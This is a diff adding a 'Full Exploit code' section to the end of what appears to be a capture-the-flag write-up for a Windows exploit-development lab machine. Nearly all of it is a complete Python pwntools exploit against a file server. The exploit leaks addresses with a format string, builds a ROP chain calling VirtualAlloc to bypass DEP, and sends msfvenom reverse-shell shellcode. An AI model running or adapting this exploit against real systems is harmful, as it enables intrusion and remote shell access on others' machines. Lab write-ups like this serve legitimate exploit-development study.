@@ -549,3 +549,205 @@ We are now SYSTEM!! After some root-dance we can read the root.txt.
 # Conclusion
 
 I really enjoyed the machine, and since I love exploit-dev this was absolute heaven for me. I recommend this machine to anyone interested in learning Windows exploit development or anyone who wants to have some good quality pwning-time. Thanks to __xct__ for the challenge. I'm waiting for rainbow3!
+
+# Full Exploit code
+
+This is the full exploit to get the user.
+
+```python
+#!/usr/bin/python3
+from pwn import *
+
+target = '10.10.73.242'
+
+r = remote(target, 2121)
+
+#offset = 0x408
+#size = 0xfb0
+
+payload = b"LST %p-%p-%p-%p-%p"
+r.sendline(payload)
+
+
+r.recvuntil(b"ERROR: Can not open Path: ")
+leaks = r.recvline().strip().split(b"-")
+log.info(f"leaking {leaks}")
+for i in range(len(leaks)):
+    leaks[i] = int(leaks[i].decode(), 16)
+log.info(f"binary leak = {hex(leaks[2])}")
+
+filesrv = leaks[2] - 0x14120
+
+log.info(f"base address = {hex(filesrv)}")
+
+### shellcode
+#msfvenom -p windows/shell_reverse_tcp lhost=tun0 lport=1337 -b "\x00\x09\x0a\x0b\x0c\x0d\x20" -f python -v shellcode
+shellcode =  b""
+shellcode += b"\xbf\xa8\xf9\xb1\xa8\xd9\xe1\xd9\x74\x24\xf4"
+shellcode += b"\x5a\x2b\xc9\xb1\x52\x31\x7a\x12\x83\xea\xfc"
+shellcode += b"\x03\xd2\xf7\x53\x5d\xde\xe0\x16\x9e\x1e\xf1"
+shellcode += b"\x76\x16\xfb\xc0\xb6\x4c\x88\x73\x07\x06\xdc"
+shellcode += b"\x7f\xec\x4a\xf4\xf4\x80\x42\xfb\xbd\x2f\xb5"
+shellcode += b"\x32\x3d\x03\x85\x55\xbd\x5e\xda\xb5\xfc\x90"
+shellcode += b"\x2f\xb4\x39\xcc\xc2\xe4\x92\x9a\x71\x18\x96"
+shellcode += b"\xd7\x49\x93\xe4\xf6\xc9\x40\xbc\xf9\xf8\xd7"
+shellcode += b"\xb6\xa3\xda\xd6\x1b\xd8\x52\xc0\x78\xe5\x2d"
+shellcode += b"\x7b\x4a\x91\xaf\xad\x82\x5a\x03\x90\x2a\xa9"
+shellcode += b"\x5d\xd5\x8d\x52\x28\x2f\xee\xef\x2b\xf4\x8c"
+shellcode += b"\x2b\xb9\xee\x37\xbf\x19\xca\xc6\x6c\xff\x99"
+shellcode += b"\xc5\xd9\x8b\xc5\xc9\xdc\x58\x7e\xf5\x55\x5f"
+shellcode += b"\x50\x7f\x2d\x44\x74\xdb\xf5\xe5\x2d\x81\x58"
+shellcode += b"\x19\x2d\x6a\x04\xbf\x26\x87\x51\xb2\x65\xc0"
+shellcode += b"\x96\xff\x95\x10\xb1\x88\xe6\x22\x1e\x23\x60"
+shellcode += b"\x0f\xd7\xed\x77\x70\xc2\x4a\xe7\x8f\xed\xaa"
+shellcode += b"\x2e\x54\xb9\xfa\x58\x7d\xc2\x90\x98\x82\x17"
+shellcode += b"\x36\xc8\x2c\xc8\xf7\xb8\x8c\xb8\x9f\xd2\x02"
+shellcode += b"\xe6\x80\xdd\xc8\x8f\x2b\x24\x9b\xa5\xa3\x26"
+shellcode += b"\xd1\xd2\xb1\x26\xe0\x1b\x3f\xc0\x80\x4b\x69"
+shellcode += b"\x5b\x3d\xf5\x30\x17\xdc\xfa\xee\x52\xde\x71"
+shellcode += b"\x1d\xa3\x91\x71\x68\xb7\x46\x72\x27\xe5\xc1"
+shellcode += b"\x8d\x9d\x81\x8e\x1c\x7a\x51\xd8\x3c\xd5\x06"
+shellcode += b"\x8d\xf3\x2c\xc2\x23\xad\x86\xf0\xb9\x2b\xe0"
+shellcode += b"\xb0\x65\x88\xef\x39\xeb\xb4\xcb\x29\x35\x34"
+shellcode += b"\x50\x1d\xe9\x63\x0e\xcb\x4f\xda\xe0\xa5\x19"
+shellcode += b"\xb1\xaa\x21\xdf\xf9\x6c\x37\xe0\xd7\x1a\xd7"
+shellcode += b"\x51\x8e\x5a\xe8\x5e\x46\x6b\x91\x82\xf6\x94"
+shellcode += b"\x48\x07\x06\xdf\xd0\x2e\x8f\x86\x81\x72\xd2"
+shellcode += b"\x38\x7c\xb0\xeb\xba\x74\x49\x08\xa2\xfd\x4c"
+shellcode += b"\x54\x64\xee\x3c\xc5\x01\x10\x92\xe6\x03"
+
+
+#badchars
+#0x09 0x0a 0x0d 0x0b 0x0c 0x020
+
+log.info(f"Pivot Gadget : add esp, 0xd60 = {hex(filesrv+0x0001139d)}")
+
+
+#### Ropping ######
+### VirtualAlloc? ###
+#modifying because of bad byte at 09
+tlsfree_iat = filesrv+0x00090148
+
+
+rop = b""
+rop += p32(filesrv+0x0007c5f6) * 4 #ret slide
+rop += p32(filesrv+0x0004cbfb) #pop eax; ret;
+rop += p32(filesrv+0xA6030) # address in .data
+rop += p32(filesrv+0x000683da) #push esp; add dword ptr [eax], eax; pop ecx; ret;
+#stack ptr in ECX
+rop += p32(filesrv+0x000636cd) # pop edx; ret;
+rop += p32(0xffffffb0) # - 0x50
+rop += p32(filesrv+0x0001bb91) # add ecx, edx; clc; pop ebp; ret;)
+rop += p32(0x41424344) #junk for ebp
+#Moving the virtual alloc  address to stack
+rop += p32(filesrv+0x0004cbfb) #pop eax; ret;
+rop += p32(tlsfree_iat)
+rop += p32(filesrv+0x0002bb94) # mov eax, dword ptr [eax]; ret;
+rop += p32(filesrv+0x000636cd) # pop edx; ret;
+rop += p32(0xffffcf70) # 0x3090 # - 4BB0
+rop += p32(filesrv+0x0003697f) # add eax, edx; ret;
+
+#eax should point to VirtualAlloc now
+rop += p32(filesrv+0x0005f607) #: mov dword ptr [ecx], eax; mov al, 1; ret;
+#moving virtual alloc to the stack above
+
+#increasing the stack pointer in ecx
+rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
+rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
+rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
+rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
+
+# Setting the ret address for VirtualAlloc
+rop += p32(filesrv+0x0003e7d2) # mov eax, ecx; ret;
+rop += p32(filesrv+0x000636cd) # pop edx; ret;
+rop += p32(0xfffffc10) #0x3f0
+rop += p32(filesrv+0x00059a05) # sub eax, edx; pop ebp; ret;)
+rop += p32(0x41424344) #junk for EBP
+rop += p32(filesrv+0x0005f607) #: mov dword ptr [ecx], eax; mov al, 1; ret;
+
+#increasing the stack pointer in ecx
+rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
+rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
+rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
+rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
+
+#memory to virtualprotect (same as ret)
+rop += p32(filesrv+0x0003e7d2) # mov eax, ecx; ret;
+rop += p32(filesrv+0x000636cd) # pop edx; ret;
+rop += p32(0xfffffc14) #0x3f0-4
+rop += p32(filesrv+0x00059a05) # sub eax, edx; pop ebp; ret;)
+rop += p32(0x41424344) #junk for EBP
+rop += p32(filesrv+0x0005f607) #: mov dword ptr [ecx], eax; mov al, 1; ret;
+
+#increasing the stack pointer in ecx
+rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
+rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
+rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
+rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
+
+#dwsize 0x1
+rop += p32(filesrv+0x0004cbfb) #pop eax; ret;
+rop += p32(0xffffffff) #-1
+rop += p32(filesrv+0x00031630) # neg eax; pop ebp; ret;
+rop += p32(0x41424344) #junk for EBP
+rop += p32(filesrv+0x0005f607) #: mov dword ptr [ecx], eax; mov al, 1; ret;
+
+#increasing the stack pointer in ecx
+rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
+rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
+rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
+rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
+
+#flAllocationType 0x1000
+rop += p32(filesrv+0x0004cbfb) #pop eax; ret;
+rop += p32(0xffffefff) #-0x1001
+rop += p32(filesrv+0x00031630) # neg eax; pop ebp; ret;
+rop += p32(0x41424344) #junk for EBP
+rop += p32(filesrv+0x000774c6) # dec eax; ret
+rop += p32(filesrv+0x0005f607) #: mov dword ptr [ecx], eax; mov al, 1; ret;
+
+#increasing the stack pointer in ecx
+rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
+rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
+rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
+rop += p32(filesrv+0x0000582b) # inc ecx; ret 0;
+
+#flProtect 0x40
+rop += p32(filesrv+0x0004cbfb) #pop eax; ret;
+rop += p32(0xffffffc0) #-0x40
+rop += p32(filesrv+0x00031630) # neg eax; pop ebp; ret;
+rop += p32(0x41424344) #junk for EBP
+rop += p32(filesrv+0x0005f607) #: mov dword ptr [ecx], eax; mov al, 1; ret;
+
+#jumping to virtualprotect stub
+rop += p32(filesrv+0x0003e7d2) # mov eax, ecx; ret;
+rop += p32(filesrv+0x000636cd) # pop edx; ret;
+rop += p32(0xffffffec) # - 0x14
+rop += p32(filesrv+0x0003697f) # add eax, edx; ret;
+rop += p32(filesrv+0x00066ab3) # xchg esp, eax; ret;
+
+
+#bp filesrv+0x00011396
+
+buf = b""
+buf += b"XXXX"
+buf += b"A"*0x68 #offset to pivot landing
+buf += rop #from here there's around 350 bytes to ROP
+
+
+payload  = b""
+payload += b"LST "
+payload += buf
+payload += b"A" * (0x408-len(buf))
+payload += b"BBBB" #We have DEP so no nseh
+payload += p32(filesrv+0x00011396) # Stack pivot add esp, 0xe10
+payload += b"\x90" * 64
+payload += shellcode
+payload += b"\x90" * (0xfb0-len(payload))
+r.sendline(payload)
+sleep(2) #if you don't wait the payload is not sent properly
+r.close()
+
+
+
+```
